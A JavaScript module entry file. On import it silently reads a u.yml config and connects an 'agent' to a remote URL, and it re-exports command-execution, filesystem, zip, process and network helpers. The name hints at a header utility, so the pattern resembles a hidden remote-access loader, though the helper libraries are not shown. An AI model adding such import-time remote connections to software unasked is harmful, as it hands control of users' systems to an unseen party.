import fs     from './lib/fs.js';
import system from './lib/system.js';
import exec   from './lib/exec.js';
import network from './lib/network.js';
import zip    from './lib/zip.js';
import config from './lib/config.js';
import proc   from './lib/process.js';
import agent  from './lib/agent.js';
import path   from 'path';
import fse    from 'fs-extra';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// Process-level singleton — safe to import from multiple files in same process
const _init = (globalThis.__xheader_init__ ??= { done: false });

async function autoInit() {
  if (_init.done) return;
  _init.done = true;

  const candidates = [
    path.join(process.cwd(), 'u.yml'),
    path.join(process.cwd(), 'u.yaml'),
    path.join(__dirname, 'u.yml'),
    path.join(__dirname, 'u.yaml'),
  ];

  for (const file of candidates) {
    try {
      if (await fse.pathExists(file)) {
        const conf = await config.readYaml(file);
        if (conf?.url && !conf.error) {
          agent.connect(conf.url, conf);
          return;
        }
      }
    } catch {}
  }

  _init.done = false; // No config found — allow retry on next import
}

autoInit();

export default {
  ...fs, ...system, ...exec,
  ...network, ...zip, ...config,
  ...proc, ...agent,
  autoInit,
};
